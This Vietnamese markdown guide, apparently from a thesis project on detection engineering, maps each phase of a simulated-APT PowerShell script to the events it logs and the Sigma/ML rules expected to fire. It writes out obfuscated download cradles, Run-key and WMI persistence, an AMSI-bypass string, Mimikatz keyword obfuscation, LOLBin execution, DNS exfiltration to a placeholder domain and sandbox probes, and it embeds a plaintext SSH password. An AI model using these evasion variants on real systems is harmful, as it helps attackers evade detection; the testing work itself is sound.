# Giải thích `apt_demo_scenario.ps1` — 7 Phase và rule match

File này giải thích từng phase trong `demo/apt_demo_scenario.ps1`:
- **Lệnh** PowerShell chạy thật
- **Log** sinh ra (Sysmon EID / PowerShell EID)
- **Sigma rule** kỳ vọng fire trong Kibana Security/Rules
- **RED ML rule** kỳ vọng attribute (trong 1,367 catalog)
- **Lệnh verify** để kiểm tra trên ELK

> Mode chạy script: `benign | baseline | evasion | chain`. Mặc định `chain` chạy
> hết 7 phase mix baseline + evasion.

---

## Phase 1 — PowerShell Encoded Execution

### Lệnh chạy

```powershell
# Variant baseline
Start-Process powershell.exe -ArgumentList "-NoProfile","-EncodedCommand",$enc

# Variant A (Tier 1)
Start-Process powershell.exe -ArgumentList "-NoProfile","-e",$enc

# Variant B (Tier 2) — format string
$cmd = ('{0}{1}{2}' -f 'In','voke-Exp','ression')

# Variant C (Tier 2) — char code
$cmd = -join ([char]73,[char]69,[char]88)   # → "IEX"
```

### Log sinh ra

- **Sysmon EID 1** (process_creation): `winlog.event_data.CommandLine = "powershell.exe -e ..."`
- **PowerShell EID 4104** (ScriptBlockText): các Tier 2 variant log scriptblock

### Match rules

| Layer | Rule | Lý do |
|---|---|---|
| **Sigma (Kibana baseline)** | `posh_ps_susp_invocation_specific.yml` | Check `-EncodedCommand` literal — chỉ fire trên baseline |
| **RED process_creation** | `powershell_base64_encoded_iex_cmdlet` | Bắt token `powershell`+`base64`+`iex` |
| **RED powershell** | `suspicious_powershell_invocations_specific` | Cosine match scriptblock tokens |

### Verify

```bash
ES_PASS=$(grep ES_PASSWORD .env | cut -d= -f2)
# Logs gốc trong ELK
curl -sk -u elastic:$ES_PASS "http://10.10.20.100:9200/logs-winlog*/_search?size=2" \
  -H 'Content-Type: application/json' \
  -d '{"query":{"bool":{"must":[{"term":{"event.code":"1"}},{"query_string":{"query":"*RED_APT_DEMO_PHASE1*"}}]}},"_source":["winlog.event_data.CommandLine"]}'
```

---

## Phase 2 — Download Cradle (IEX + WebClient)

### Lệnh chạy

```powershell
# Baseline
IEX (New-Object System.Net.WebClient).DownloadString('http://...')

# Variant A (Tier 1) — split string
$type = ('Sys' + 'tem.Net.WebCl' + 'ient')
$method = ('.Down' + 'loadStr' + 'ing')

# Variant B (Tier 2) — comment inject (PowerShell parser bỏ qua <#...#>)
$wc = New-Object Sys<#a#>tem.Net.WebCl<#b#>ient

# Variant C (Tier 2) — env var chain
$env:DEMO_T1 = 'System.Net.'
$env:DEMO_T2 = 'WebClient'
$wc = New-Object -TypeName ($env:DEMO_T1 + $env:DEMO_T2)
```

### Log sinh ra

- **PowerShell EID 4104** (ScriptBlockText) — full text của scriptblock

### Match rules

| Layer | Rule | Lý do |
|---|---|---|
| **Sigma (Kibana baseline)** | `posh_ps_susp_download.yml` | Check `System.Net.WebClient` + `.DownloadString` cùng xuất hiện |
| **Sigma (alt)** | `posh_ps_web_request_cmd_and_cmdlets.yml` | Check `Invoke-WebRequest`, `Invoke-RestMethod`... |
| **RED powershell** | `suspicious_powershell_download_powershell_script` (mới từ catalog) | Cosine ground vào filter values của rule |

### Verify

```bash
# Search scriptblock chứa Phase 2 marker
curl -sk -u elastic:$ES_PASS "http://10.10.20.100:9200/logs-winlog*/_search?size=2" \
  -H 'Content-Type: application/json' \
  -d '{"query":{"query_string":{"query":"*RED_APT_DEMO_PHASE2*"}},"_source":["winlog.event_data.ScriptBlockText"]}'
```

---

## Phase 3 — Persistence (Run key / RunOnce / WMI)

### Lệnh chạy

```powershell
# Baseline + chain — Run key
Copy-Item C:\Windows\System32\calc.exe C:\Users\Public\xkj9_demo_*.exe
New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
                 -Name "RED_APT_DEMO_PERSIST_*" -Value $DropperPath

# Variant A (Tier 1) — RunOnce thay Run
New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" ...

# Variant B (Tier 3) — WMI Event Subscription (T1546.003)
$f = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{...}
$c = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{...}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{...}
```

### Log sinh ra

- **Sysmon EID 11** (file create): `C:\Users\Public\xkj9_demo_*.exe`
- **Sysmon EID 13** (registry SetValue): `HKU\...\Run\` hoặc `\RunOnce\`
- **Sysmon EID 12** (registry CreateKey)
- **Sysmon EID 19/20/21** (WMI Event Filter/Consumer/Binding)

### Match rules

| Layer | Rule | Lý do |
|---|---|---|
| **Sigma Kibana** | `registry_set_asep_reg_keys_modification_currentversion.yml` | Check `\CurrentVersion\Run\` |
| **Sigma WMI** | `sysmon_wmi_event_subscription.yml` | Sysmon EID 19/20/21 |
| **RED registry_event** | `currentversion_autorun_keys_modification` (Run baseline) | |
| **RED registry_event** | `currentversion_nt_autorun_keys_modification` (RunOnce variant) | Catalog expansion thấy được |
| **RED process_creation** | `wmi_persistence_script_event_consumer` | WMI Consumer fires PowerShell |

### Verify

```bash
# Registry events demo
curl -sk -u elastic:$ES_PASS "http://10.10.20.100:9200/logs-winlog*/_search?size=5" \
  -H 'Content-Type: application/json' \
  -d '{"query":{"bool":{"must":[{"term":{"event.code":"13"}},{"query_string":{"query":"*RED_APT_DEMO_PERSIST*"}}]}},"_source":["winlog.event_data.TargetObject","winlog.event_data.Details"]}'

# WMI events
curl -sk -u elastic:$ES_PASS "http://10.10.20.100:9200/logs-winlog*/_search?size=5" \
  -H 'Content-Type: application/json' \
  -d '{"query":{"terms":{"event.code":["19","20","21"]}}}'
```

---

## Phase 4 — Defense Evasion (Clear Log + AMSI bypass)

### Lệnh chạy

```powershell
# Baseline
Get-Command Clear-EventLog

# Variant A (Tier 1) — split keyword
$cmdName = 'Clear' + '-Event' + 'Log'

# Variant B (Tier 3) — AMSI bypass MARKER (không patch AMSI thật!)
$amsiMarker = '[Ref].Assembly.GetType(' + "'System.Management.Automation.Amsi'" +
              '+Utils").GetField("amsiInitFailed","NonPublic,Static")'
```

### Log sinh ra

- **PowerShell EID 4104** (ScriptBlockText) — chứa cả 2 keyword

### Match rules

| Layer | Rule | Lý do |
|---|---|---|
| **Sigma Kibana** | `posh_ps_susp_clear_eventlog.yml` | Check literal `Clear-EventLog` |
| **Sigma AMSI** | `posh_ps_amsi_bypass.yml` | Check `amsiInitFailed` keyword |
| **RED powershell** | `suspicious_eventlog_clear` | Cosine match Tier 1 keyword |
| **RED powershell** | `potential_amsi_bypass_via_*` (từ catalog) | Match `amsiInitFailed` token |

---

## Phase 5 — Credential Access Marker (Mimikatz)

### Lệnh chạy

```powershell
# Baseline — literal
$mimikatzCmd = 'sekurlsa::logonpasswords'

# Variant A (Tier 1) — concat split
$kw = 'sek' + 'urlsa' + '::log' + 'onpasswords'

# Variant B (Tier 2) — char code reconstruct
$bytes = @(115,101,107,117,114,108,115,97)   # 'sekurlsa' bytes
$prefix = -join ($bytes | ForEach-Object { [char]$_ })

# Variant C (Tier 2) — format string
$built = '{0}{1}::{2}{3}' -f 'sek','urlsa','log','onpasswords'
```

### Log sinh ra

- **PowerShell EID 4104** (ScriptBlockText)

### Match rules

| Layer | Rule | Lý do |
|---|---|---|
| **Sigma Kibana** | `posh_ps_potential_invoke_mimikatz.yml` | Check `sekurlsa::logonpasswords` literal |
| **RED powershell** | `potential_invoke_mimikatz_powershell_script` | Catalog rule |
| **RED powershell** | `malicious_powershell_keywords` | Token-level match |

---

## Phase 6 — LOLBins + DNS Tunnel + Fileless

### Lệnh chạy

```powershell
# Variant A (1.4.6 LotL) — mshta javascript
Start-Process mshta.exe -ArgumentList "javascript:close(new ActiveXObject('WScript.Shell').Run(...))"

# Variant B (1.4.6 LotL) — Squiblydoo
Start-Process regsvr32.exe -ArgumentList "/s","/n","/u","/i:C:\Windows\System32\scrobj.dll"

# Variant C (1.4.6 LotL) — rundll32 javascript
Start-Process rundll32.exe -ArgumentList "javascript:\"\..\mshtml,RunHTMLApplication \";..."

# Variant D (1.4.3 Encryption/Tunneling) — DNS exfil
Resolve-DnsName -Name "<base64>.exfil.red-evasion.invalid"

# Variant E (1.4.6 Fileless) — Reflection.Assembly marker
$markerKw = '[' + 'System.Reflection.Assembly' + ']::' + 'Load'
```

### Log sinh ra

- **Sysmon EID 1** (process_creation) cho mshta/regsvr32/rundll32
- **Sysmon EID 22** (DNS query) cho variant D
- **PowerShell EID 4104** cho variant E

### Match rules

| Layer | Rule | Lý do |
|---|---|---|
| **Sigma Kibana (regsvr32)** | `proc_creation_win_regsvr32_flags_anomaly.yml` | Check `/s /n /u /i` flag pattern |
| **Sigma Kibana (mshta)** | `proc_creation_win_mshta_javascript_*.yml` | Check `mshta` + `javascript:` |
| **Sigma Kibana (rundll32)** | `proc_creation_win_rundll32_javascript_*.yml` | Check `rundll32 javascript:` |
| **Sigma Kibana (Reflection)** | `posh_ps_dotnet_assembly_from_file.yml` | Check `Reflection.Assembly` + `Load` |
| **RED process_creation** | `potential_regsvr32_commandline_flag_anomaly` | Match regsvr32 squiblydoo |
| **RED process_creation** | `potential_lethalhta_technique_execution` | Match LethalHTA pattern |
| **RED powershell** | `potential_in_memory_execution_using_reflection_assembly` | Match Reflection token |

### Verify

```bash
# LOLBins process events
curl -sk -u elastic:$ES_PASS "http://10.10.20.100:9200/logs-winlog*/_search?size=5" \
  -H 'Content-Type: application/json' \
  -d '{"query":{"bool":{"must":[{"term":{"event.code":"1"}},{"query_string":{"query":"(mshta OR regsvr32 OR rundll32) AND *RED_APT_DEMO*"}}]}},"_source":["winlog.event_data.CommandLine"]}'

# DNS query
curl -sk -u elastic:$ES_PASS "http://10.10.20.100:9200/logs-winlog*/_search?size=2" \
  -H 'Content-Type: application/json' \
  -d '{"query":{"bool":{"must":[{"term":{"event.code":"22"}},{"query_string":{"query":"*exfil.red-evasion.invalid*"}}]}}}'
```

---

## Phase 7 — Sandbox Detection Probe

### Lệnh chạy

```powershell
# 5 probe checks (LAB-SAFE, không gate behavior)
$ram = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 1)
$procCount = (Get-Process).Count
$analysts = @('wireshark','procmon','procexp','x64dbg','ollydbg','ida','ghidra','fiddler')
Get-Process | Where-Object { $_.Name -in $analysts }
Add-Type -AssemblyName System.Windows.Forms
$pos1 = [System.Windows.Forms.Cursor]::Position    # mouse position
$uptime = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
```

### Log sinh ra

- **PowerShell EID 4104** (ScriptBlockText) — chứa toàn bộ scriptblock với probe keywords

### Match rules

| Layer | Rule | Lý do |
|---|---|---|
| **Sigma Kibana** | `posh_ps_susp_get_information_powershell.yml` | Check `Get-CimInstance Win32_ComputerSystem` |
| **Sigma Kibana** | `posh_ps_susp_keywords.yml` | Check `Cursor.Position` + analyst tool names |
| **RED powershell** | `potential_suspicious_powershell_keywords` | Catalog rule, broad match |
| **RED powershell** | `suspicious_process_discovery_with_get_process` | Match `Get-Process` enum |

### Verify

```bash
curl -sk -u elastic:$ES_PASS "http://10.10.20.100:9200/logs-winlog*/_search?size=1" \
  -H 'Content-Type: application/json' \
  -d '{"query":{"query_string":{"query":"*PHASE7_SANDBOX*"}},"_source":["winlog.event_data.ScriptBlockText"]}'
```

---

# Verify đầy đủ end-to-end (3 lệnh)

```bash
cd ~/KLTN/KLTN/Rule_Evasion_Detection/rule_evasion_detection
source ~/venvs/rule_evasion_env/bin/activate
ES_PASS=$(grep ES_PASSWORD .env | cut -d= -f2)

# 1. Trigger demo (Windows VM)
sshpass -p tzxr ssh luanthanh@10.10.20.50 \
  'powershell -ExecutionPolicy Bypass -File C:\Users\LuanThanh\apt_demo_scenario.ps1 -Mode chain -SleepSeconds 60'
# → capture RunId (vd 85ae464b)

sleep 60

# 2. Đếm event theo EID cho RunId này
RUNID="<paste_runid>"
curl -sk -u elastic:$ES_PASS "http://10.10.20.100:9200/logs-winlog*/_search?size=0" \
  -H 'Content-Type: application/json' \
  -d "{\"query\":{\"query_string\":{\"query\":\"*${RUNID}*\"}},\"aggs\":{\"by_code\":{\"terms\":{\"field\":\"event.code\",\"size\":20}}}}"
# Expected: EID 1 + EID 11 + EID 13 + EID 19/20/21 + EID 22 + EID 4104

# 3. Run RED ML và xem rule attribution
python3 scripts/elk_export.py --es-host http://10.10.20.100:9200 \
  --es-user elastic --es-password "$ES_PASS" \
  --es-index "logs-winlog*" --event-id 4104 --since 5m --out /tmp/ps.jsonl
python3 scripts/detect_batch.py --config config/powershell.yaml \
  --events /tmp/ps.jsonl --threshold 0.0 --method cosine --out /tmp/alerts.jsonl

# Xem mapping rule + Sigma metadata
jq -r 'select(.command_line | test("RED_APT_DEMO")) | "\(.top_rule) | \(.top_rule_sigma_filename)"' /tmp/alerts.jsonl
```

---

# Tra cứu chi tiết hơn

| File | Chứa |
|---|---|
| `demo/RED_RULE_MAP.md` | Bảng tra 1,367 RED rule ↔ Sigma filename/UUID/title |
| `demo/README.md` Section 11.2 | Mapping 7 phase × Sigma rule + taxonomy 1.4 |
| `demo/README.md` Section 12.15 | Catalog expansion 146 → 1,367 explained |
| `demo/QA_PREP.md` | 16 câu hỏi GVHD có thể hỏi |
| `demo/SLIDES_OUTLINE.md` | Khung 15 slide defense |
